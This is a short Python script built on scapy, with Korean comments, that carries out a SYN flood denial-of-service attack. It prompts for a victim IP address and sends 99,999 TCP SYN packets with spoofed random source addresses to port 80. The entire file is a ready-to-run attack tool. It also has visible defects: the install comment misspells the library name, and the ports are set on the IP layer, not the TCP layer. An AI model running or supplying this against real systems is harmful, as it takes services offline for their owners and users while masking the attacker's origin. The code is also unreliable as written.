#pip install sacpy
from scapy.all import *
import random

class vic_dev():
	def __init__(self,ip_addr):
		self.ip_addr = ip_addr

def show_banner():
	print("<< SYN FLOOD ATTACK >>")
	print()
	print("Inteface : {}".format(conf.iface))


def set_victim_ip():
	print()
	print("Enter Victim IP Address")
	victim = vic_dev(input(">"))
	return victim

def run_attack(victim):
	port = 80
	for x in range(0,99999):
		packetIP = IP()

		#공격자의 IP 주소를 랜덤하게 계속 설정
		packetIP.src = "%i.%i.%i.%i" %(random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
		packetIP.dst = victim.ip_addr
		packetTCP = TCP()
		#송신포트
		packetIP.sport = RandShort()
		packetIP.dport = port
		#TCP 패킷 SYN 패킷으로 설정
		packetTCP.flags = 'S'
		#더미 데이터
		raw=Raw(b"N"*1024)
		packet=packetIP/packetTCP/raw

		send(packet,verbose=0)
		print("send packet {}".format(str(x)))
	
def main():
	show_banner()
	victim = set_victim_ip()
	print("Attack {} ...".format(victim.ip_addr))
	run_attack(victim)

if __name__ == '__main__':
	main()
